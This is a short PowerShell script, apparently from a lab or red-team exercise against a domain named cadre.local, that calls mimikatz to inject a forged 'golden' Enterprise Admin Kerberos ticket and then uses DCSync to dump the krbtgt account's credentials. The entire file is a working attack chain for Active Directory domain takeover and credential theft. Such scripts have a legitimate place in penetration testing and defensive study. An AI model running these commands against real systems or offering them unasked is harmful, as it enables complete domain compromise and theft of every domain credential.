[CmdletBinding()]
param()
$ErrorActionPreference = "Continue"

$mimi = 'C:\Tools\ADTools\mimikatz.exe'
$ticket = 'C:\Tools\cadre-attack\T102-capture\EA.kirbi'

Write-Output '--- ptt golden EA ticket ---'
& $mimi "privilege::debug" "kerberos::ptt $ticket" "exit" 2>&1 | ForEach-Object { Write-Output "MIMI|$_" }

Write-Output '--- DCSync cadre.local krbtgt via golden ticket ---'
& $mimi "kerberos::ptt $ticket" "lsadump::dcsync /domain:cadre.local /user:krbtgt" "exit" 2>&1 | ForEach-Object { Write-Output "MIMI|$_" }
